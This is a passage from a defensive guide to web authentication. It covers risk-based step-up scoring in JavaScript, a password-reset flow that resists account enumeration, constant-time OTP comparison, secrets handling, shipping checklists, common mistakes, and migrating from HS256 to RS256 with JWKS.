        return {
            riskScore: RiskFactor.ACCOUNT_LOCKED.points,
            factors: [RiskFactor.ACCOUNT_LOCKED],
            shouldExit: true
        }
    }
    return { riskScore: 0, factors: [], shouldExit: false }
}

function assessFailedAttempts( user ) {
    if ( user?.failedAttemptCount > FAILED_ATTEMPT_THRESHOLD ) {
        return { riskScore: RiskFactor.FAILED_ATTEMPTS.points, factors: [RiskFactor.FAILED_ATTEMPTS] }
    }
    return { riskScore: 0, factors: [] }
}

function assessInactivity( user ) {
    if ( !user?.lastSuccess ) {
        return { riskScore: 0, factors: [] }
    }
    const lastSuccessDate = new Date( user.lastSuccess )
    if ( isNaN( lastSuccessDate.getTime() ) ) {
        return { riskScore: 0, factors: [] }
    }
    const daysSince = ( Date.now() - lastSuccessDate.getTime() ) / ( 1000 * 60 * 60 * 24 )

    if ( daysSince > EXTENDED_INACTIVITY_DAYS ) {
        return { riskScore: RiskFactor.EXTENDED_INACTIVITY.points, factors: [RiskFactor.EXTENDED_INACTIVITY] }
    }
    if ( daysSince > MODERATE_INACTIVITY_DAYS ) {
        return { riskScore: RiskFactor.MODERATE_INACTIVITY.points, factors: [RiskFactor.MODERATE_INACTIVITY] }
    }
    return { riskScore: 0, factors: [] }
}
```

The default in `assessDeviceRisk` returns **NEW_DEVICE points, not zero**. An unrecognized status is an unknown, and an unknown is not evidence of safety. Fail closed here exactly as in Section 5: when a check cannot answer, the answer is not "safe".

One loose end on purpose: `classifyDevice` never returns `DeviceStatus.SUSPICIOUS`. That case is a hook for an external signal, an abuse feed, a bot detector, an admin flag. Until something sets it the branch is inert, but the wiring is already in place for the day such a signal arrives.

Every assessor is a **pure function** taking data and returning a verdict. No database, no request object, no clock beyond `Date.now()`. That makes each one testable in three lines with no mocking:

```javascript
expect( assessInactivity( { lastSuccess: daysAgo( 100 ) } ) ).toEqual( {
    riskScore: 25,
    factors: [RiskFactor.EXTENDED_INACTIVITY]
} )
```

**Test the assessors directly, not through the orchestrator.** This is worth insisting on. It is very easy to write a test called "should assess higher risk for a new device" that calls the top-level entry point and asserts a session token came back, which passes whether the score is 30 or 0 or NaN. A test that does not assert the score is not testing the scoring. Assert the number and the factors, or you have coverage without confidence, which is worse than no coverage because it feels like safety.

### Aggregating

```javascript
const MAX_RISK_SCORE = 100

function calculateRiskScore( user, deviceStatus ) {
    const deviceRisk = assessDeviceRisk( deviceStatus )

    // Locked account short-circuits: nothing else can lower this.
    const lockedAccount = assessLockedAccount( user )
    if ( lockedAccount.shouldExit ) {
        return { riskScore: lockedAccount.riskScore, factors: lockedAccount.factors }
    }

    const failedAttempts = assessFailedAttempts( user )
    const inactivity = assessInactivity( user )

    const riskScore = Math.min(
        deviceRisk.riskScore + lockedAccount.riskScore + failedAttempts.riskScore + inactivity.riskScore,
        MAX_RISK_SCORE
    )

    const factors = [
        ...deviceRisk.factors,
        ...lockedAccount.factors,
        ...failedAttempts.factors,
        ...inactivity.factors
    ].filter( Boolean )

    return { riskScore, factors }
}
```

**Additive and unweighted.** Signals sum. There are no multipliers, no coefficients, no model. This is a deliberate choice and the right one to start with, because you can explain any score to a human: "30 for a new device plus 25 for a year of inactivity is 55, which is HIGH." Try that with logistic regression at 2am during an incident.

**Capped at 100.** Keeps thresholds meaningful and stops three moderate signals from summing past a level reserved for something worse.

**Short-circuit on locked.** A locked account is maximum risk. Nothing observed afterwards can reduce it, so stop looking. Note it returns *only* the lockout factor, so your logs say `ACCOUNT_LOCKED`, not a five-item list where the real reason is buried.

### Thresholds, and what each level demands

```javascript
const RiskThresholds = Object.freeze( {
    CRITICAL: 70,
    HIGH:     50,
    MEDIUM:   30,
    LOW:      0,
} )

function determineRiskLevel( riskScore ) {
    if ( riskScore >= RiskThresholds.CRITICAL ) {
        return RiskLevel.CRITICAL
    } else if ( riskScore >= RiskThresholds.HIGH ) {
        return RiskLevel.HIGH
    } else if ( riskScore >= RiskThresholds.MEDIUM ) {
        return RiskLevel.MEDIUM
    } else {
        return RiskLevel.LOW
    }
}
```

Then map level to demand, **degrading gracefully to what the user actually has**:

```javascript
function determineRequiredVerifications( riskLevel, user = null ) {
    // Unknown user: email only. See the enumeration section below.
    if ( !user ) {
        return ['email']
    }

    const hasEmail = user.confirmedEmail === true
    const hasMobile = user.confirmedMobile === true

    switch ( riskLevel ) {
    case RiskLevel.CRITICAL:
        return hasMobile && hasEmail ? ['email', 'sms'] : ['email']
    case RiskLevel.HIGH:
        return hasMobile ? ['sms'] : ['email']
    case RiskLevel.MEDIUM:
    case RiskLevel.LOW:
    default:
        return ['email']
    }
}
```

The `hasMobile` checks matter. Demand a second factor from a user who does not have one enrolled and you have not secured anything, you have permanently locked them out of their own account with no path back. Always degrade to a factor they can actually complete.

> **Read this before you pick SMS as your strong factor.**
>
> The code above uses SMS because it is the factor most systems already have, and it makes the pattern concrete. But **SMS is not actually a strong factor, and the standards say so.**
>
> NIST SP 800-63B-4 designates PSTN-delivered codes, which covers both SMS and voice, as a **restricted** authenticator, the only category it restricts.[^nist-restricted] OWASP's Multifactor Authentication Cheat Sheet repeats this and names the reasons: SS7 interception, SIM-swap, and number-porting attacks. An attacker who can talk a phone carrier into moving a number, which is a social engineering problem and not a cryptographic one, receives every code you send. OWASP's guidance is direct: do not use SMS for high-value applications, and plan migration to TOTP, push notifications, or WebAuthn/FIDO2.[^owasp-mfa]
>
> So treat the ladder above as **email → a genuinely stronger factor**, and choose that stronger factor in this order:
>
> 1. **WebAuthn / passkey.** Phishing-resistant, bound to the origin. The best answer available.
> 2. **TOTP** (authenticator app). No carrier in the trust path.
> 3. **Push notification** to an authenticated app.
> 4. **SMS.** Only when the user has nothing else, and knowing what it does not protect against.
>
> Swapping it in is mechanical, since the shape of this design does not care what the factor is:
>
> ```javascript
> case RiskLevel.HIGH:
>     if ( user.hasWebAuthn ) return ['webauthn']
>     if ( user.hasTotp )     return ['totp']
>     if ( hasMobile )        return ['sms']    // last resort, restricted
>     return ['email']
> ```
>
> The RBA machinery, scoring, thresholds, pre-marking, and the completion check, is entirely indifferent to which factor you demand. That is the point of keeping `requiredVerifications` a list of strings. **Do not let a worked example choose your security architecture for you.**
>
> Note also that SMS being restricted does not make email strong. It is worse: NIST does not recognize email as an out-of-band authenticator at all, because possession of an inbox does not prove possession of a specific device.[^nist-email] Email codes are a friction step and an audit trail, not a NIST-approved factor. If you are protecting anything that matters, get your users onto passkeys or TOTP.

> **The trap hiding in this function, and it is a good one.** This code reads `user.confirmedEmail` and `user.confirmedMobile`. If you loaded that user with a projection or a `select`, those fields **must be in it**. Mongoose's `select` is an allow-list: fields you did not name come back `undefined`, `undefined === true` is `false`, and `hasMobile` is silently `false` for everyone. Your SMS step-up quietly stops existing. No error, no warning. HIGH and CRITICAL degrade to email and the system looks like it is working.
>
> Unit tests will not save you, because your mock returns a fully-populated user object that the real projection never fetches. **Whenever a function reads a field, verify the query that loaded it actually selected that field.** Better: assert on the projection in an integration test that uses the real query.

Sample scores:

| Situation | Math | Level | Demand |
|---|---|---|---|
| Daily user, known laptop | 0 | LOW | Email code |
| Known laptop, idle 2 weeks | 15 | LOW | Email code |
| New device, active account | 30 | MEDIUM | Email code |
| New device, idle 3 months | 30 + 25 = 55 | HIGH | Strong factor (TOTP or passkey) |
| New device, 6 failed attempts, idle a year | 30 + 25 + 25 = 80 | CRITICAL | Email **and** strong factor |
| Locked account | 100 | CRITICAL | Email **and** strong factor |

> **Sanity-check your own table like this before you ship.** Two things fall out immediately here that are invisible in the code.
>
> First, **LOW and MEDIUM demand exactly the same thing.** The distinction does nothing. That is fine if it is deliberate, so that MEDIUM exists to be logged and tuned later, but you should *know* it, because if you thought MEDIUM was buying protection, it is not.
>
> Second, work out what your **realistic maximum** is. Above, a non-locked user tops out at 80, so CRITICAL (70) is reachable, but only by someone who is simultaneously on a new device, actively failing passwords, and dormant for a year. If the numbers had come out so that no realistic combination could reach your top threshold, that entire tier would be dead code and you would never know from reading it. Add up your worst realistic case and confirm each tier is reachable.

### Making risk decisions stick

Do not re-score at every step. Compute risk **once**, at the start, then record what was decided.

The elegant trick: **pre-mark anything you did not require as already satisfied.**

```javascript
function createSessionData( { userId, requiredVerifications, riskAssessment, fingerprintHash, ... } ) {
    return {
        userId,
        riskAssessment,
        requiredVerifications,
        fingerprintHash,

        // Anything not required is satisfied by definition.
        emailVerified: !requiredVerifications.includes( 'email' ),
        smsVerified: !requiredVerifications.includes( 'sms' ),

        emailAttempts: 0,
        smsAttempts: 0,
        expiresAt: Date.now() + ( SESSION_TTL_SECONDS * 1000 )
    }
}
```

Now the completion check does not care what the risk was:

```javascript
const isComplete = emailVerified && smsVerified
```

For a LOW-risk user, `smsVerified` started `true`, so only email gates them. For CRITICAL, both start `false` and both must be earned. **One expression handles every risk level**, with no branching on level at completion time.

This is the useful shape: the risk decision is made once, at the front, and expressed as *initial state* rather than as a rule that has to be re-consulted. Downstream code stays simple and cannot drift out of sync with the scoring logic.

### Bind the session, and check the binding

Store the fingerprint on the session, then **actually compare it on every subsequent step**:

```javascript
async function verifyOtp( sessionToken, otpCode, req ) {
    const session = await cache.get( CacheKeys.RESET_SESSION, sessionToken )

    if ( !session ) {
        return { error: RbaVerifyErrorCode.SESSION_NOT_FOUND }
    }

    // The session is bound to the device that started it.
    if ( session.fingerprintHash !== createDeviceFingerprint( req ) ) {
        await cache.delete( CacheKeys.RESET_SESSION, sessionToken )
        console.warn( {
            message: 'Reset session fingerprint mismatch, session destroyed',
            service: 'rba',
            sessionId: session.sessionId
        } )
        return { error: RbaVerifyErrorCode.SESSION_NOT_FOUND }
    }
    // ... verify the OTP
}
```

Storing the fingerprint and never comparing it is a mistake that looks exactly like success in code review: the field is right there in the session object, it looks bound. Without the comparison, possession of the session cookie alone is enough, from any device, and the binding is decoration.

**If you store a security property, check it.** An unchecked check is worse than no check, because it makes everyone believe the protection exists.

### Compare OTPs in constant time

```javascript
function otpMatches( provided, expected ) {
    const a = Buffer.from( String( provided ) )
    const b = Buffer.from( String( expected ) )
    if ( a.length !== b.length ) {
        return false
    }
    return crypto.timingSafeEqual( a, b )
}
```

Same reasoning as signature comparison in Section 3, but the stakes are higher. A 6-digit OTP has a million possibilities, which sounds like a lot until you realize a timing oracle turns "guess the whole code" into "guess each digit", collapsing a million guesses into about sixty.

`===` on a secret is a habit worth breaking permanently. **Any time you compare a value an attacker supplies against a secret, use `timingSafeEqual`.** OTPs, signatures, API keys, reset tokens, webhook signatures. Make it reflexive.

### Limit attempts per factor

```javascript
const MAX_OTP_ATTEMPTS = 3

if ( session.emailAttempts >= MAX_OTP_ATTEMPTS ) {
    await cache.delete( CacheKeys.RESET_SESSION, sessionToken )
    return { error: RbaVerifyErrorCode.MAX_ATTEMPTS_EXCEEDED }
}
```

Without a limit, a 6-digit OTP falls to brute force in minutes. Three attempts, then destroy the session and start over.

Count **per factor**, not per session. Otherwise three bad email guesses consume the budget for the SMS step the user has not reached yet.

### Do not leak whether an account exists

This is the subtle one, and where RBA implementations most often undo themselves.

`/password-reset/initiate` takes an email. The naive implementation returns "no such user" for unknown emails. Congratulations, you have built an **account enumeration oracle**: an attacker feeds it a breach dump and learns exactly which of ten million addresses have accounts with you. Those addresses are now worth money, and they will get targeted phishing.

Every response must be indistinguishable. Three things leak, and you must close all three.

**1. The message.** Always the same, regardless:

```javascript
return res.status( 200 ).json( {
    message: 'If an account exists with this email, a verification code has been sent.'
} )
```

**2. The behavior.** An unknown email must still return a session token and still ask for a code. The flow proceeds identically and simply never succeeds. Score unknown users on a plausible path:

```javascript
function assessRisk( user, deviceStatus ) {
    if ( user ) {
        const { riskScore, factors } = calculateRiskScore( user, deviceStatus )
        const riskLevel = determineRiskLevel( riskScore )
        return {
            riskAssessment: { score: riskScore, level: riskLevel, factors, deviceStatus },
            requiredVerifications: determineRequiredVerifications( riskLevel, user )
        }
    }

    // Non-existent user: capped at MEDIUM on purpose.
    // We CANNOT assign CRITICAL, because CRITICAL demands SMS and a
    // non-existent user has no phone. Demanding SMS here would be a
    // dead giveaway that the account does not exist.
    return {
        riskAssessment: {
            score: RiskFactor.NEW_DEVICE.points,
            level: RiskLevel.MEDIUM,
            factors: [RiskFactor.NEW_DEVICE],
            deviceStatus
        },
        requiredVerifications: ['email']
    }
}
```

Read that comment twice, because the reasoning is genuinely subtle and it is the kind of thing that only turns up when someone thinks it through properly. The *obvious* move is to treat an unknown account as maximum risk. It feels right. It is exactly wrong: CRITICAL demands SMS, an unknown account cannot have a phone, so every unknown account produces a distinguishable response, and your maximum-security setting **is** the enumeration oracle. Security reasoning has to run all the way to the observable behavior, not stop at "unknown means dangerous".

**3. The timing.** The killer, and the one everyone forgets. A real user costs a database read plus a bcrypt comparison, roughly 100ms. An unknown user returns after a failed lookup in 5ms. **An attacker with a stopwatch does not need your error messages.** You said the same words both times and the response time told them everything.

Normalize it. Every response takes at least a fixed floor:

```javascript
async function normalizeResponseTime( startTime, minimumMs ) {
    const elapsed = Date.now() - startTime
    if ( elapsed < minimumMs ) {
        await new Promise( resolve => setTimeout( resolve, minimumMs - elapsed ) )
    }
}

async function performRiskAssessment( req, email ) {
    const startTime = Date.now()
    try {
        // ... the real work, fast or slow
        return result
    } finally {
        await normalizeResponseTime( startTime, MIN_RESPONSE_TIME_MS )
    }
}
```

Pick a floor comfortably above your slowest legitimate path (500ms is a reasonable start) and **put it in `finally`**, so it applies to the error paths too. An error path that returns in 5ms while success takes 500ms is the same leak wearing a different hat.

None of the three is optional. OWASP's Forgot Password guidance asks for a consistent message for existent and non-existent accounts **and** responses that return in a consistent amount of time.[^owasp-forgot]

### Worked example: password reset

Password reset is the ideal first home for RBA. It is a **complete account takeover** if abused: whoever completes it owns the account. It is also rare and already slow, so nobody notices a 500ms floor or an extra code.

Same machinery applies to login step-up, or to any sensitive action: changing payout details, adding an API key, inviting an admin.

Four endpoints:

| Endpoint | Does |
|---|---|
| `POST /password-reset/initiate` | Score risk, decide demands, create session, send code(s) |
| `POST /password-reset/verify` | Check one OTP, mark that factor satisfied |
| `POST /password-reset/complete` | If all factors satisfied, set the new password |
| `POST /password-reset/cancel` | Destroy the session |

![sequence diagram 3|622](sequence-3.svg)

Steps 21 and 22 are the ones that get skipped, and both matter:

- **Enroll the device.** They just completed a full step-up. That is proof. Without this they are permanently high-risk on that device.
- **Revoke every session.** The most likely reason for a reset is that the account is compromised. Reset the password, leave the attacker's refresh token alive, and you have achieved nothing while making the user feel safe. This is a genuinely dangerous combination: false confidence plus continued access.

And one thing that must **not** happen at the end:

> **Do not log the user in after a successful reset.** OWASP's Forgot Password Cheat Sheet is explicit: do not automatically log the user in after a reset.[^owasp-forgot] Send them to the login page to sign in with their new password.
>
> It feels hostile. It is one extra step for someone who just proved themselves twice. Do it anyway. Auto-login turns the reset flow into an **alternative authentication path** that bypasses your actual login, along with every control attached to it: rate limiting, lockout counters, login-time risk checks, audit trail. Anyone who completes a reset is now authenticated without your login code ever running. You have built a second front door and secured only the first.
>
> Making them log in also confirms the new password reached them intact, and gives you one clean, auditable authentication event rather than a session that appeared from a side channel.

### Session state for the reset flow

| Property  | Choice                                                      | Why                                                  |
| --------- | ----------------------------------------------------------- | ---------------------------------------------------- |
| Token     | 32 random bytes, hex                                        | Opaque. Carries no data, so nothing to forge or read |
| Transport | httpOnly cookie, path-scoped to `/api/open/password-reset/` | Same reasoning as Section 4                          |
| Storage   | Redis, keyed by token                                       | Server-side. Revocable. Expires itself               |
| TTL       | 30 minutes                                                  | Long enough to read an email, short enough to matter |
| Delete    | In a `finally`                                              | One-time use guaranteed, even when something throws  |

```javascript
const sessionToken = crypto.randomBytes( 32 ).toString( 'hex' )
```

**Why opaque here, when the rest of this document is about JWTs?**

Because this state is short-lived, single-purpose, mutates on every step (attempt counters, verification flags), and must be revocable instantly. A JWT would have to be re-signed and re-issued on every OTP attempt, and you would *still* need a server-side record to prevent replay. All of the JWT's advantages, statelessness and no lookup, are worthless when you need a lookup anyway.

**Match the tool to the lifetime.** JWTs earn their keep for long-lived, read-mostly, high-volume verification. Opaque tokens win for short-lived, mutable, low-volume state. Reaching for a JWT here because "we use JWTs" is cargo cult.

> Name your TTL constants after their actual units, and make the name match the value. A constant called `sessionTimeToLiveMs` holding `1800` is a landmine: it is internally consistent as long as everything treats it as seconds, and the day someone reads the name, believes it, and sets the env var to `1800000`, they have created a 20-day password reset session. Nobody will notice, because it works.

### Send the codes

Generating an OTP, storing it in Redis, and returning `nextStep: 'verify-email'` **is not sending it.**

This sounds too obvious to state. It is not. Everything about the flow looks finished: the code is generated, the session is stored, the response tells the client to prompt for a code, the tests pass because they read the OTP straight out of the mocked cache. The one thing missing is the part that leaves the building, and it is the only part the user experiences.

```javascript
// initiate/index.js  -  the step that is easy to leave out
globalEventEmitter.emit( EventName.send_otp_email, {
    userId: user.id,
    email: user.email,
    otp: session.emailOtp
} )

if ( requiredVerifications.includes( 'sms' ) ) {
    globalEventEmitter.emit( EventName.send_otp_sms, {
        userId: user.id,
        mobile: user.mobile,
        otp: session.smsOtp
    } )
}
```

**Test the flow end to end, as a human, with a real inbox.** Not through mocks. A test that asserts the OTP is in the cache proves the OTP is in the cache. Only a real run proves a user can reset their password.

Two related traps in the same neighborhood:

- **OTP override env vars.** `AUTH_OTP_OVERRIDE=123456` is convenient for local development and for tests. It is also a master key to every account. Make it structurally impossible in production: refuse to boot if it is set while `NODE_ENV === 'production'`. Do not rely on remembering to unset it.
- **The mock/reality gap.** If your mock server and your real API drift, you can develop happily against a flow that does not exist. Periodically run the real thing.

### Log the decision, always

```javascript
console.info( {
    message: 'Risk assessment completed',
    service: 'rba',
    userId: user.id,
    riskScore: riskAssessment.score,
    riskLevel: riskAssessment.level.toString(),
    riskFactors: riskAssessment.factors.map( f => f.name ).join( ',' ),
    deviceStatus: deviceStatus.toString(),
    requiredVerifications: requiredVerifications.join( ',' )
} )
```

Without this you cannot answer "why did this user get asked for a code?", you cannot tune your thresholds because you have no distribution to look at, and you cannot investigate an incident.

Log the **factors**, not just the score. `55` tells you nothing. `NEW_DEVICE,EXTENDED_INACTIVITY` tells you the whole story.

Log the user id, never the OTP. The OTP is a credential. It does not go in your logs, your traces, or your error reports.

### The complete decision flow

![flowchart diagram 6|622](flowchart-6.svg)

### Tuning

Your first thresholds will be wrong. Everyone's are. The numbers here are a starting point, not a recommendation.

**Ship in shadow mode first.** Score every attempt, log the result, demand nothing extra. Run for a fortnight and look at the distribution. If 60% of your users score HIGH, your weights are wrong and turning it on would have generated a support queue and taught your users that codes are constant noise to be clicked through.

Then turn it on for the top tier only. Watch the support load. Loosen as needed.

**A step-up prompt has a real cost.** Every one is friction, a chance to drop off, and a chance for the user to learn that security prompts are normal. That last one is how you train your users to be phished: a population conditioned to type codes on request whenever a website asks is a population primed for the attack you cannot patch. Ask only when you mean it.

---

## 8. How To: Practical Recipes

### Adding a new protected endpoint

1. Put the file under your protected route tree. Do not hand-apply auth middleware.
2. Validate and coerce every input. Path params, query, body. Use a schema library.
3. Scope every query to the caller. Never trust an id from the client to be theirs.
4. Return 404, not 403, for resources the caller cannot see. 403 confirms it exists.
5. Return the minimum fields the client needs.

### Checklist: shipping a token system

Payload (remember: world-readable):

- [ ] No raw database id in `sub`. Encrypted, or a separate random public id
- [ ] No passwords, secrets, or keys
- [ ] No PII (email, phone, legal name)
- [ ] Roles in the token, or looked up per request, decided **deliberately** and the reason written down

If you encrypt the id:

- [ ] AEAD cipher (`aes-256-gcm`), not bare CBC
- [ ] Fresh `crypto.randomBytes(12)` nonce **per call**, never constant, never derived
- [ ] IV and auth tag packed alongside the ciphertext
- [ ] `createCipheriv`, never `createCipher`
- [ ] Auth tag failure allowed to throw, never caught and softened
- [ ] Encryption key is 32 bytes, from env, and separate from the signing key

Verification:

- [ ] Algorithm pinned to a hardcoded constant, never read from the token
- [ ] Signature compared with `crypto.timingSafeEqual`
- [ ] `exp` checked on every verify, and a **missing** `exp` fails
- [ ] `iss` and `aud` checked
- [ ] Token type (`typ`) checked, so a refresh token cannot be used as an access token
- [ ] Claim checks run **after** signature verification, never before
- [ ] Clock skew leeway applied to time-based claims
- [ ] One generic error for every failure mode
- [ ] Auth applied at the route tree root, not per-route

Cookies:

- [ ] `httpOnly: true`
- [ ] `secure: true`
- [ ] `sameSite: 'strict'` or `'lax'`
- [ ] Refresh cookie path-scoped to the refresh endpoint
- [ ] Cookie expiry matches token expiry, never exceeds it (watch seconds vs milliseconds)
- [ ] `Cache-Control: no-store` on responses that issue tokens

Refresh:

- [ ] Access TTL 5 to 15 minutes
- [ ] TTLs read from env, validated at boot, and **actually used by the minting code**
- [ ] A test asserts the minted `exp` matches the configured TTL
- [ ] `jti` stored on issue, awaited
- [ ] Store TTL derived from token `exp`
- [ ] Validation **fails closed** when the store is unreachable
- [ ] Rotation on every refresh
- [ ] Reuse detection revokes the whole family
- [ ] Sign-out deletes the family server-side, not just the cookie
- [ ] Password change deletes the family
- [ ] Refresh endpoint is rate limited
- [ ] User re-checked (active? suspended?) on every refresh

Client:

- [ ] Tokens never in localStorage or sessionStorage
- [ ] `withCredentials: true` on the instance, not per call
- [ ] Separate instances for authenticated and open endpoints
- [ ] Single-flight refresh (mandatory if you rotate)
- [ ] `_retry` guard against recursion
- [ ] `error.response?.status` with optional chaining
- [ ] 403 not treated as a session problem
- [ ] Query cache cleared on both sign-out and expiry

Risk-based auth and password reset:

- [ ] Identical response for existing and non-existent accounts: message, behavior, **and timing**
- [ ] Unknown accounts never scored into a tier that demands a factor they cannot have
- [ ] Strong factor is TOTP or WebAuthn, not SMS (NIST-restricted) where you have the choice
- [ ] Always degrades to a factor the user has actually enrolled
- [ ] Every field the risk logic reads is in the query's projection
- [ ] OTPs compared with `crypto.timingSafeEqual`
- [ ] Attempt limits counted **per factor**, session destroyed on exhaustion
- [ ] Reset session token is opaque, 32 random bytes, TTL'd, single-use, deleted in a `finally`
- [ ] Session bound to a fingerprint, and the binding is **actually compared** on later steps
- [ ] The OTPs are genuinely **sent**, verified by a real end-to-end run, not a mock
- [ ] OTP override env vars structurally impossible in production
- [ ] Device enrolled on reset completion, not just on login
- [ ] All token families revoked on reset
- [ ] **No auto-login** after reset
- [ ] Decision logged with factors, never with the OTP

Secrets:

- [ ] Signing key from env, 32+ random bytes
- [ ] No default value in code
- [ ] `.env` in `.gitignore`
- [ ] `.env.example` contains **placeholders**, never real values
- [ ] Boot fails loudly if a key is missing or too short

### Managing secrets

```bash
# .env.example  -  COMMITTED. Placeholders only.
AUTH_JWT_SIGNING_KEY=replace-me-openssl-rand-hex-32
AUTH_DEVICE_FINGERPRINT_SALT=replace-me-openssl-rand-hex-32
AUTH_ACCESS_TOKEN_TTL_SECONDS=300
AUTH_REFRESH_TOKEN_TTL_SECONDS=86400
```

```bash
# .gitignore
.env
.env.*
!.env.example
```

Validate at boot so a missing key stops the process rather than producing broken tokens:

```javascript
function requireKey( name, minBytes = 32 ) {
    const value = process.env[ name ]
    if ( !value || Buffer.byteLength( value ) < minBytes ) {
        throw new Error( `${name} must be set and at least ${minBytes} bytes` )
    }
    return value
}

const jwtKey = requireKey( 'AUTH_JWT_SIGNING_KEY' )
```

**Two failure modes worth naming, because both are common and both are quiet:**

*Copying real values into `.env.example`.* It is committed. That is its entire purpose. A real key in there is a public key, and because the file looks like documentation, nobody reviewing the PR reads the values. Generate placeholders.

*Fallback defaults in code.* This pattern:

```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key'
```

is worse than no default at all. It means a misconfigured production deploy does not crash. It **boots successfully** and signs every token with a string that is sitting in a public GitHub repo. You get no error, no warning, and a system that appears completely healthy while anyone who has read your source can mint a token for any user. **Let it crash.** A crash at boot is a five-minute fix; this is a breach.

If a key does leak, rotate it. Every token signed with the old key becomes invalid and every user is logged out. That is the cost, and it is worth paying immediately.

### Choosing what to build

Not everything here is mandatory on day one. Rough order of value:

| Priority | Item | Why |
|---|---|---|
| **1** | httpOnly cookies | Removes the entire token-theft-via-XSS category |
| **1** | Algorithm pinning | Trivial to add, catastrophic to omit |
| **1** | Short access TTL | Bounds every other failure |
| **1** | Secrets from env, no defaults | One committed key voids everything else |
| **2** | Refresh + jti allowlist | Makes revocation possible at all |
| **2** | Fail closed | Stops your controls having an off switch |
| **2** | Sign-out revokes server-side | Otherwise sign-out is theater |
| **2** | Single-flight refresh | Prevents the intermittent-logout bug |
| **3** | Rotation + reuse detection | Makes theft *detectable* |
| **3** | Path-scoped refresh cookie | Large win, one line |
| **3** | Rate limit refresh | Cheap, no downside |
| **4** | Device binding | Speed bump, not a wall |
| **4** | RBA | Real value, real complexity, needs tuning |

Tier 1 is not optional. Tiers 3 and 4 are judgement calls against your threat model.

---

## 9. Common Mistakes

**Putting the token in localStorage.** One hostile dependency and your tokens are exfiltrated. Use httpOnly cookies.

**Putting a raw database id in `sub`.** The payload is world-readable, so you have published your primary key. Sequential ids leak volume and ordering; MongoDB ObjectIds additionally leak account creation time. Encrypt it, or expose a separate random public id.

**Assuming the payload is private.** It is base64, not encryption. Signed means unmodified, not secret. No PII, no secrets.

**Encrypting an id deterministically.** No nonce means the same id always produces the same ciphertext, which is a stable pseudonym an attacker can correlate across logs without ever decrypting it. You renamed the identifier; you did not hide it.

**Reusing a GCM nonce.** Catastrophic, not marginal: it leaks the authentication subkey and enables tag forgery. Fresh `randomBytes(12)` every call.

**Using `crypto.createCipher`.** No IV, weak key derivation, deprecated, and removed in Node 22. Always `createCipheriv`.

**Trusting `alg` from the token.** `alg: none` and algorithm confusion. Pin it to a constant.

**A missing claim defaulting to pass.** `now >= undefined` is `false`, so a token with no `exp` reads as "not expired". Check the claim exists before you compare it.

**Not checking token type.** Same signing key means a refresh token *is* an access token. Check `typ`.

**Seconds versus milliseconds.** `exp` is seconds. `Date.now()` is milliseconds. `new Date(exp * 1000)`.

**Refresh without single-flight.** Concurrent 401s stampede. With rotation, they log the user out. Intermittent and hell to debug.

**Retrying 403 as if it were 401.** Bounces valid users to login for clicking something they lack permission for.

**Sign-out that only clears cookies.** Anyone who copied the token still has a working session. Delete it server-side.

**Password change that does not revoke.** The attacker you are changing the password *because of* keeps their session. Feels fixed. Is not.

**Auto-login after a password reset.** Creates a second authentication path that bypasses your login and every control attached to it. OWASP says do not do it.

**Treating SMS as your strong factor.** NIST designates it restricted: SIM-swap, SS7, number-porting. It is the factor you already have, not the factor you want. Prefer TOTP or WebAuthn.

**Leaking account existence through response timing.** You returned the same message and the stopwatch told them anyway. Normalize the response time in a `finally`.

**Failing open when the token store is down.** Your revocation, binding, and reuse detection all silently disable together, during an outage, which an attacker can cause.

**Fire-and-forget writes to the token store.** A fast client beats the write and gets a spurious 401.

**Fallback secrets in code.** Production boots fine and signs tokens with a string from your public repo. Let it crash instead.

**Real values in `.env.example`.** It is committed. That is the point of it.

**TTL config that nothing reads.** Validated at boot, exported, documented, and ignored by the minting code. Trace it from env to `exp` and write a test that keeps it honest.

**Leaking why verification failed.** "Expired" versus "bad signature" is a free oracle. One generic error.

**Sharing an HS256 secret across services so they can verify.** With symmetric signing, verifying and forging are the same power. You did not distribute a verifier, you distributed a token factory. Move to RS256 and JWKS.

**Trusting a gateway-set header like `X-User-Id`.** Secure only while the gateway is the sole route to the service, which is a claim about your network that Kubernetes will eventually falsify. Forward the token and verify it.

**Sending the ID token to your API.** It works, which is why it survives. Its `aud` names your client, not your API, so an API that accepts it is not checking `aud` properly and will accept ID tokens minted for other clients. Send the access token.[^rfc9068]

**Using the implicit flow.** Superseded. RFC 9700 says clients SHOULD NOT use it. Authorization Code + PKCE.

**Rotating without a plan for the race.** Rotation plus concurrent refresh equals mass logout. They ship together or not at all.

---

## 10. Beyond One Service: OIDC, Discovery, and Distributed Security

Everything up to here assumes one thing, quietly, and it is time to say it out loud: **you are the issuer.** One service mints tokens, the same service verifies them, one secret does both jobs, and the only participants are your API and your browser.

For one service, that is not a compromise. It is the right answer. You do not need a discovery document to talk to yourself.

This section is about what happens when that assumption stops holding, so you can recognize the moment rather than discover it during an incident.

### The moment HS256 turns on you

Section 2 said: start with HS256, move to RS256 when a service needs to verify tokens without being trusted to mint them. That sentence is doing more work than it looks.

HS256 is **symmetric**. Verifying requires recomputing the HMAC, which requires the secret, which is the same secret used to sign. So:

> **With HS256, the power to verify and the power to forge are the same power.**

One service, that is a distinction without a difference. Twenty services, it is the whole ballgame. Ship that secret to twenty services so they can check tokens, and you have created **twenty services that can mint a token for any user**. Your reporting service can mint an admin token. So can the batch job someone wrote in a hurry. Any one of them leaking that secret compromises every user of every service, and you will not be able to tell a forged token from a real one, because there is no difference.

RS256 splits the power in two:

- The authorization server holds the **private** key. It alone signs.
- Every other service gets the **public** key. It can verify and it cannot forge.

That is not a performance tuning decision. It is the difference between twenty trusted issuers and one.

![flowchart diagram 7|622](flowchart-7.svg)

**The signal to migrate:** the first time you are about to copy a signing secret into a second service's config. That is the moment, and it always feels too small to stop for.

### JWKS: publishing keys instead of shipping them

If services need a public key, how do they get it? Not from config, or you are back to distributing key material by hand.

They fetch it. A **JWKS** (JSON Web Key Set, [RFC 7517](https://datatracker.ietf.org/doc/html/rfc7517)) is a JSON document at a URL, holding a `keys` array of public keys:

```json
{
  "keys": [
    { "kty": "RSA", "kid": "2026-07-key-a", "use": "sig", "alg": "RS256", "n": "...", "e": "AQAB" },
    { "kty": "RSA", "kid": "2026-01-key-b", "use": "sig", "alg": "RS256", "n": "...", "e": "AQAB" }
  ]
}
```

Every token's **header** carries a `kid` naming which key signed it:

```json
{ "alg": "RS256", "typ": "JWT", "kid": "2026-07-key-a" }
```

